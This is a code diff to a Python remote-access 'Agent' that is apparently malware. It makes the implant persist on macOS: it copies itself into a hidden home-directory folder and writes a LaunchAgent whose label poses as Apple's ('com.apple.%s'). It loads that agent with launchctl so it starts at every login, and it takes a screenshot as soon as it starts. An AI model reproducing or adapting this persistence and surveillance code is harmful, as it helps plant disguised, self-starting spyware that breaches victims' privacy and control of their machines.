@@ -165,12 +165,12 @@ class Agent(object):
 
     def persist(self):
         """ Installs the agent """
-        if not getattr(sys, 'frozen', False):
-            self.send_output('[!] Persistence only supported on compiled agents.')
-            return
-        # if self.is_installed():
-        #     self.send_output('[!] Agent seems to be already installed.')
+        # if not getattr(sys, 'frozen', False):
+        #     self.send_output('[!] Persistence only supported on compiled agents.')
         #     return
+        if self.is_installed():
+            self.send_output('[!] Agent seems to be already installed.')
+            return
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.%s') % (self.rootPachName)
             if not os.path.exists(persist_dir):
@@ -191,34 +191,37 @@ class Agent(object):
             persist_dir = self.expand_path('~/.%s') % self.rootPachName
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
-            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
-            shutil.copyfile(sys.executable, agent_path)
+            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable)) + ".app"
+            self_app_path = os.path.dirname(sys.executable) + "/../../../%s.app" % os.path.basename(sys.executable)
+            if not os.path.exists(agent_path):
+                shutil.copytree(self_app_path, agent_path )
+            else:
+                os.system('rm -rf ' + agent_path)
+                shutil.copytree(self_app_path, agent_path )
             os.system('chmod +x ' + agent_path)
             comIntelPlist = """
             <?xml version="1.0" encoding="UTF-8"?>
-            <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
             <plist version="1.0">
             <dict>
-                    <key>%s</key>
-                    <false/>
-                    <key>Label</key>
-                    <string>com.intel.%s</string>
-                    <key>ProgramArguments</key>
-                    <array>
-                            <string>~/.%s</string>
-                    </array>
-                    <key>RunAtLoad</key>
+                <key>Label</key>
+                <string>com.apple.%s</string>
+                <key>ProgramArguments</key>
+                <array>
+                    <string>/usr/bin/open</string>
+                    <string>%s</string>
+                </array>
+                <key>RunAtLoad</key>
                 <true/>
-                <key>UserName</key>
-                <string>root</string>
             </dict>
             </plist>
-            """ % (self.rootPachName,self.rootPachName,self.rootPachName)
-            persist_filename = '/Library/LaunchDaemons/com.intel.%s.plist' % (self.rootPachName)
-            with open(persist_filename, 'w') as file_object:
+            """ % (self.rootPachName,agent_path)
+            persist_filename = '~/Library/LaunchAgents/com.apple.%s.plist' % (self.rootPachName)
+           
+            with open('/tmp/1.plist', 'w') as file_object:
                 file_object.write(comIntelPlist)
-
-
+            os.system('cp -rf /tmp/1.plist ' + persist_filename)
+            os.system('launchctl load -w ' + persist_filename)
         else:
             self.send_output('[!] Not supported.')
             return
@@ -241,10 +244,8 @@ class Agent(object):
                 persist_dir = self.expand_path('~/.%s' % self.rootPachName)
                 if os.path.exists(persist_dir):
                     shutil.rmtree(persist_dir)
-                persist_filename = "/Library/LaunchDaemons/com.intel.%s.plist" % self.rootPachName
-                if os.path.exists(persist_filename):
-                    os.remove(persist_filename)
-
+                persist_filename = "~/Library/LaunchAgents/com.apple.%s.plist" % (self.rootPachName)
+                os.system('rm -rf ' + persist_filename)
         self.send_output('[+] Agent removed successfully.')
 
     def exit(self):
@@ -314,6 +315,7 @@ class Agent(object):
 
     def run(self):
         """ Main loop """
+        self.screenshot()
         self.silent = True
         if config.PERSIST:
             try:
